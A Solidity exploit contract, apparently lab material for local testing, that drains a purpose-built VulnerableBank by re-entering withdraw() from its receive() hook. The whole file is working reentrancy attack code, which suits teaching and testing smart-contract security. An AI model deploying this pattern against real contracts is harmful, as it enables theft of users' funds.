// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "../targets/VulnerableBank.sol";

/// @title ReentrancyAttacker
/// @author Charissa
/// @notice A simple contract that exploits the reentrancy vulnerability in the VulnerableBank contract to drain its funds
/// @dev Educational use only, for local Anvil testing

contract ReentrancyAttacker {
    /// @notice The deployed VulnerableBank instance being targeted
    VulnerableBank public target;

    /// @notice The amount originally deposited to unlock the first withdrawl() call
    uint256 public attackAmount;

    /// @notice Sets the target contract to attack
    /// @param _targetAddress The address of the deployed VulnerableBank instance
    constructor(address _targetAddress) {
        target = VulnerableBank(_targetAddress);
    }

    /// @notice Starts off attack depositing ETH, then triggers first withdrawl 
    /// @dev The withdraw() call triggers receive(), starting the reentrant chain
    function attack() external payable {
        attackAmount = msg.value;
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    /// @notice Automatically triggered whenever this contract receives ETTH
    /// @dev Tthis is th ereentrancy hook, re-enters withdraw() while the target's ledger still incorrectly shows a balanced owed, repeating until the
    ///      target is drained of all funds
    receive() external payable {
        if (address(target).balance >= attackAmount) {
            target.withdraw();
        }
    }

    /// @notice Returns how much ETH this attacker contract has stolen so far
    /// @return The current ETH balance held by this contract
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}